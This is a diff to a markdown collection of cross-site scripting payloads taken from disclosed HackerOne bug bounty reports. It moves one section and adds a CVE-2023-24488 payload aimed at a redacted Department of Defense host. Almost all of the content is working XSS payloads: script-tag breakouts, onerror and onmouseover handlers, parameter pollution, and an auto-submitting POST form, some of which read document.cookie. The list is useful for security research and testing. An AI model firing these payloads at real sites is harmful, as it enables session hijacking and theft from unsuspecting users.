@@ -1,6 +1,6 @@
 # Cross-site Scripting
 
-804 payloads from disclosed reports.
+805 payloads from disclosed reports.
 
 ## Reflected XSS via javascript: URI in referer parameter
 
@@ -1053,6 +1053,99 @@ https://target.com/?contact[email]%20onfocus%3djavascript:alert(%27xss%27)%20aut
 — [XSS: `v-safe-html` is not safe enough](https://hackerone.com/reports/1579645) · GitLab · [yvvdwf](https://hackerone.com/yvvdwf)
 
 
+## Reflected XSS via script injection in the username part of the URL
+
+### `f1fee819`
+
+```
+https://target.com/unsubscribe?email=kolabro</script><script>alert(document.domain)</script>
+```
+
+**Parameter:** `email`
+— [RXSS on unsubscribe feature (target.com)](https://hackerone.com/reports/733152) · Clario · [sec0ndw0lf](https://hackerone.com/sec0ndw0lf) · $75.0
+
+### `cd48a960`
+
+```
+https://target.com/account/testcatplzignore%22%3E%3Cimg%20src=x%20onerror=prompt(document.domain
+```
+
+**Parameter:** `username`
+— [Reflected XSS in target.com](https://hackerone.com/reports/149855) · Imgur · [logue](https://hackerone.com/logue)
+
+### `3b819d1d`
+
+```
+target.com/badges?hostname=hostname" type="text/javascript"> /*&hostname=*/alert('XSS\n-Rohit Dua'); //
+```
+
+**Parameter:** `hostname`
+— [Cross Site Scripting(XSS) on IRCCloud Badges Page (using Parameter Pollution)](https://hackerone.com/reports/150083) · IRCCloud · [rohitdua](https://hackerone.com/rohitdua)
+
+### `275f65ee`
+
+```
+<script type="text/javascript">
+...
+ga('set', 'dimension1', 'board-'-alert(document.domain)-'');
+ga('set', 'dimension2', 'False');
+ga('set', 'dimension3', 'False');});});</script>
+```
+
+— [\[target.com\] 429 Too Many Requests Error-Page XSS](https://hackerone.com/reports/189768) · Quora · [bobrov](https://hackerone.com/bobrov)
+
+### `f4dd4931`
+
+```
+<html>
+  <body>
+    <form action="https://target.com/my-posts/api/image/upload/?CKEditor=text&CKEditorFuncNum=dadasd</script><script>alert(document.domain)</script>&langCode=en" method="POST">
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
+```
+
+**Parameter:** `CKEditorFuncNum`
+— [Post Based XSS On Upload Via CK Editor \[target.com\]](https://hackerone.com/reports/375352) · Semrush · [apapedulimu](https://hackerone.com/apapedulimu)
+
+### `b3292ef6`
+
+```
+Payload 1: Mouse Over XSS
+---------------------------
+%0d%0a</script><h1+onmouseover=alert(document.cookie)>MOUSEOVER_XSS</h1>
+
+
+Payload 2: 
+---------
+%0d%0a</script><img+src=x+onerror=alert(document.domain)>
+```
+
+**Parameter:** `userPage`
+— [Reflected Cross Site Scripting at  ColdFusion Debugging Panel  http://target.com/CFIDE/debug/cf_debugFr.cfm](https://hackerone.com/reports/1166918) · Acronis · [ub3rsick](https://hackerone.com/ub3rsick)
+
+### `2d077d97`
+
+```
+http://target.com/CFIDE/debug/cf_debugFr.cfm?userPage=%0d%0a</script><h1+onmouseover=alert(document.cookie)>MOUSEOVER_XSS</h1>
+
+http://target.com/CFIDE/debug/cf_debugFr.cfm?userPage=%0d%0a</script><img+src=x+onerror=alert(document.domain)>
+```
+
+**Parameter:** `userPage`
+— [Reflected Cross Site Scripting at  ColdFusion Debugging Panel  http://target.com/CFIDE/debug/cf_debugFr.cfm](https://hackerone.com/reports/1166918) · Acronis · [ub3rsick](https://hackerone.com/ub3rsick)
+
+### `be1ceda9`
+
+```
+https://█████/oauth/idp/logout?post_logout_redirect_uri=%0d%0a%0d%0a<script>alert(document.domain)</script>
+```
+
+**Parameter:** `post_logout_redirect_uri`
+— [CVE-2023-24488 xss on https://██████/](https://hackerone.com/reports/2045549) · U.S. Dept Of Defense · [0xmaruf](https://hackerone.com/0xmaruf)
+
+
 ## Stored XSS via script tag in ticket content
 
 ### `a8569524`
@@ -1142,90 +1235,6 @@ attack()
 
 **Parameter:** `link_name`
 — [Stored XSS via LINK Name.](https://hackerone.com/reports/1392262) · Insightly · [xploiterr](https://hackerone.com/xploiterr)
-
-
-## Reflected XSS via script injection in the username part of the URL
-
-### `f1fee819`
-
-```
-https://target.com/unsubscribe?email=kolabro</script><script>alert(document.domain)</script>
-```
-
-**Parameter:** `email`
-— [RXSS on unsubscribe feature (target.com)](https://hackerone.com/reports/733152) · Clario · [sec0ndw0lf](https://hackerone.com/sec0ndw0lf) · $75.0
-
-### `cd48a960`
-
-```
-https://target.com/account/testcatplzignore%22%3E%3Cimg%20src=x%20onerror=prompt(document.domain
-```
-
-**Parameter:** `username`
-— [Reflected XSS in target.com](https://hackerone.com/reports/149855) · Imgur · [logue](https://hackerone.com/logue)
-
-### `3b819d1d`
-
-```
-target.com/badges?hostname=hostname" type="text/javascript"> /*&hostname=*/alert('XSS\n-Rohit Dua'); //
-```
-
-**Parameter:** `hostname`
-— [Cross Site Scripting(XSS) on IRCCloud Badges Page (using Parameter Pollution)](https://hackerone.com/reports/150083) · IRCCloud · [rohitdua](https://hackerone.com/rohitdua)
-
-### `275f65ee`
-
-```
-<script type="text/javascript">
-...
-ga('set', 'dimension1', 'board-'-alert(document.domain)-'');
-ga('set', 'dimension2', 'False');
-ga('set', 'dimension3', 'False');});});</script>
-```
-
-— [\[target.com\] 429 Too Many Requests Error-Page XSS](https://hackerone.com/reports/189768) · Quora · [bobrov](https://hackerone.com/bobrov)
-
-### `f4dd4931`
-
-```
-<html>
-  <body>
-    <form action="https://target.com/my-posts/api/image/upload/?CKEditor=text&CKEditorFuncNum=dadasd</script><script>alert(document.domain)</script>&langCode=en" method="POST">
-      <input type="submit" value="Submit request" />
-    </form>
-  </body>
-</html>
-```
-
-**Parameter:** `CKEditorFuncNum`
-— [Post Based XSS On Upload Via CK Editor \[target.com\]](https://hackerone.com/reports/375352) · Semrush · [apapedulimu](https://hackerone.com/apapedulimu)
-
-### `b3292ef6`
-
-```
-Payload 1: Mouse Over XSS
----------------------------
-%0d%0a</script><h1+onmouseover=alert(document.cookie)>MOUSEOVER_XSS</h1>
-
-
-Payload 2: 
----------
-%0d%0a</script><img+src=x+onerror=alert(document.domain)>
-```
-
-**Parameter:** `userPage`
-— [Reflected Cross Site Scripting at  ColdFusion Debugging Panel  http://target.com/CFIDE/debug/cf_debugFr.cfm](https://hackerone.com/reports/1166918) · Acronis · [ub3rsick](https://hackerone.com/ub3rsick)
-
-### `2d077d97`
-
-```
-http://target.com/CFIDE/debug/cf_debugFr.cfm?userPage=%0d%0a</script><h1+onmouseover=alert(document.cookie)>MOUSEOVER_XSS</h1>
-
-http://target.com/CFIDE/debug/cf_debugFr.cfm?userPage=%0d%0a</script><img+src=x+onerror=alert(document.domain)>
-```
-
-**Parameter:** `userPage`
-— [Reflected Cross Site Scripting at  ColdFusion Debugging Panel  http://target.com/CFIDE/debug/cf_debugFr.cfm](https://hackerone.com/reports/1166918) · Acronis · [ub3rsick](https://hackerone.com/ub3rsick)
 
 
 ## Stored XSS using <img onerror> attribute injection
